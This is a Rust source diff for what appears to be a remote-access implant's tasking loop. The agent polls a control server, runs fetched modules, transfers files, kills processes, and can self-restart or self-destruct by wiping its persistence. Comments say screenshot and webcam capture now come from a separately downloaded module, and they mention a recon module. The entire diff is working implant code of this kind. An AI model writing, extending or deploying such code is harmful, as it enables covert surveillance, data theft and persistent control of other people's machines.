@@ -34,64 +34,94 @@ pub(crate) async fn heartbeat_tick(
     agent_id: &str,
     session_key: Option<&[u8; 32]>,
     module_manager: &std::sync::Arc<tokio::sync::Mutex<crate::module_manager::ModuleManager>>,
-) -> Result<bool, String> {
-    let (task, ws_needed) = http.heartbeat(agent_id, session_key).await?;
-    if let Some(ref task) = task {
-        libra_common::dlog!("[RECV] task | id={} | type={:?} | cmd={} | timeout={}s",
-            task.id,
-            task.command_type,
-            task.command,
-            task.timeout_seconds
-        );
+) -> Result<(), String> {
+    // 心跳兜底：刷新在线状态 + 拉取可能错过的任务（SSE 为主通道）。
+    // 心跳响应里的 wsNeeded 已废弃（零 WS 架构）。
+    let (task, _ws_needed) = http.heartbeat(agent_id, session_key).await?;
+    if let Some(task) = task {
+        handle_task(http, &task, agent_id, session_key, module_manager).await;
+    }
+    Ok(())
+}
 
-        // Resolve the module entry under the lock, then execute it *without*
-        // the lock so a long-running task never blocks the heartbeat (or other
-        // tasks) — the same concurrency model as the WS dispatcher.
-        let outcome = {
-            let mut mm = module_manager.lock().await;
-            resolve_task(task, &mut mm).await
-        };
+/// 已处理的任务 id（SSE 推送与心跳轮询双通道去重；容量上限防内存增长）。
+static SEEN_TASKS: std::sync::LazyLock<std::sync::Mutex<std::collections::HashSet<String>>> =
+    std::sync::LazyLock::new(|| std::sync::Mutex::new(std::collections::HashSet::new()));
+const SEEN_TASK_CAP: usize = 512;
 
-        let (result, exit_action) = match outcome {
-            TaskOutcome::Run { main, input } => {
-                let output = match crate::module_manager::execute_module(main, &input).await {
-                    Ok(r) => r,
-                    Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
-                };
-                (wrap_result(&task.id, &output), ExitAction::None)
-            }
-            TaskOutcome::DoneUnwrapped(r) => (r, ExitAction::None),
-            TaskOutcome::DoneWrapped(r) => (wrap_result(&task.id, &r), ExitAction::None),
-            TaskOutcome::Destroy => (
-                wrap_result(&task.id, r#"{"status":"destroying","op":"kill_and_clean"}"#),
-                ExitAction::Destroy,
-            ),
-            TaskOutcome::Restart => (
-                wrap_result(&task.id, r#"{"status":"restarting"}"#),
-                ExitAction::Restart,
-            ),
-        };
-
-        libra_common::dlog!("[SEND] task_result | id={} | len={}", task.id, result.len());
-        let _ = http.submit_result(agent_id, &result, session_key).await;
-
-        // Self-destruct / self-restart happen *after* the result is submitted,
-        // so the server records the task as completed and the agent then exits.
-        match exit_action {
-            ExitAction::Destroy => {
-                libra_common::dlog!("[kill_and_clean] removing persistence and exiting");
-                crate::persistence::PersistenceManager::cleanup();
-                std::process::exit(0);
-            }
-            ExitAction::Restart => {
-                libra_common::dlog!("[restart] spawning self and exiting");
-                spawn_self();
-                std::process::exit(0);
-            }
-            ExitAction::None => {}
+/// 执行一个任务（SSE 推送或心跳轮询到达均可调用；按 task.id 去重）。
+/// `http` 用于结果上报（需已配置 session_token + profile）。
+pub(crate) async fn handle_task(
+    http: &HttpCommunicator,
+    task: &libra_common::models::AgentTask,
+    agent_id: &str,
+    session_key: Option<&[u8; 32]>,
+    module_manager: &std::sync::Arc<tokio::sync::Mutex<crate::module_manager::ModuleManager>>,
+) {
+    // 去重：同一任务 id 只执行一次（SSE 推送 + 心跳兜底可能重复到达）
+    {
+        let mut seen = SEEN_TASKS.lock().unwrap();
+        if seen.len() >= SEEN_TASK_CAP {
+            seen.clear();
+        }
+        if !seen.insert(task.id.clone()) {
+            libra_common::dlog!("[task] duplicate id={} — skipped", task.id);
+            return;
         }
     }
-    Ok(ws_needed)
+    libra_common::dlog!("[RECV] task | id={} | type={:?} | cmd={} | timeout={}s",
+        task.id,
+        task.command_type,
+        task.command,
+        task.timeout_seconds
+    );
+
+    // Resolve the module entry under the lock, then execute it *without*
+    // the lock so a long-running task never blocks the heartbeat (or other
+    // tasks) — the same concurrency model as the WS dispatcher.
+    let outcome = {
+        let mut mm = module_manager.lock().await;
+        resolve_task(task, &mut mm).await
+    };
+
+    let (result, exit_action) = match outcome {
+        TaskOutcome::Run { main, input } => {
+            let output = match crate::module_manager::execute_module(main, &input).await {
+                Ok(r) => r,
+                Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
+            };
+            (wrap_result(&task.id, &output), ExitAction::None)
+        }
+        TaskOutcome::DoneUnwrapped(r) => (r, ExitAction::None),
+        TaskOutcome::DoneWrapped(r) => (wrap_result(&task.id, &r), ExitAction::None),
+        TaskOutcome::Destroy => (
+            wrap_result(&task.id, r#"{"status":"destroying","op":"kill_and_clean"}"#),
+            ExitAction::Destroy,
+        ),
+        TaskOutcome::Restart => (
+            wrap_result(&task.id, r#"{"status":"restarting"}"#),
+            ExitAction::Restart,
+        ),
+    };
+
+    libra_common::dlog!("[SEND] task_result | id={} | len={}", task.id, result.len());
+    let _ = http.submit_result(agent_id, &result, session_key).await;
+
+    // Self-destruct / self-restart happen *after* the result is submitted,
+    // so the server records the task as completed and the agent then exits.
+    match exit_action {
+        ExitAction::Destroy => {
+            libra_common::dlog!("[kill_and_clean] removing persistence and exiting");
+            crate::persistence::PersistenceManager::cleanup();
+            std::process::exit(0);
+        }
+        ExitAction::Restart => {
+            libra_common::dlog!("[restart] spawning self and exiting");
+            spawn_self();
+            std::process::exit(0);
+        }
+        ExitAction::None => {}
+    }
 }
 
 /// Spawn a detached copy of the current executable (the agent binary).
@@ -177,6 +207,13 @@ async fn resolve_task(
             let json = format!(r#"{{"drives":[{}]}}"#, escaped.join(","));
             TaskOutcome::DoneUnwrapped(json)
         }
+        CommandType::Generic => {
+            // 通用模块执行：command = 模块名，arguments[0] = 输入 JSON
+            let input = task.arguments.first()
+                .and_then(|a| serde_json::from_str::<serde_json::Value>(a).ok())
+                .unwrap_or_else(|| serde_json::json!({}));
+            run(task.command.clone(), input).await
+        }
         CommandType::Upload | CommandType::Download => {
             // File transfer with arguments: FileOps read/write (cloud module)
             if let Some(arg) = task.arguments.first() {
@@ -193,13 +230,6 @@ async fn resolve_task(
             } else {
                 TaskOutcome::DoneWrapped(r#"{"error":"No file path specified"}"#.to_string())
             }
-        }
-        CommandType::Screenshot => {
-            // 本体零 WS：截图由 realtime 模块提供（按需下载，进程内执行）
-            run("realtime".to_string(), serde_json::json!({ "action": "screenshot", "quality": "medium" })).await
-        }
-        CommandType::Webcam => {
-            run("realtime".to_string(), serde_json::json!({ "action": "webcam", "index": 0 })).await
         }
         CommandType::Kill => {
             // Kill specific process by PID (cloud recon module)
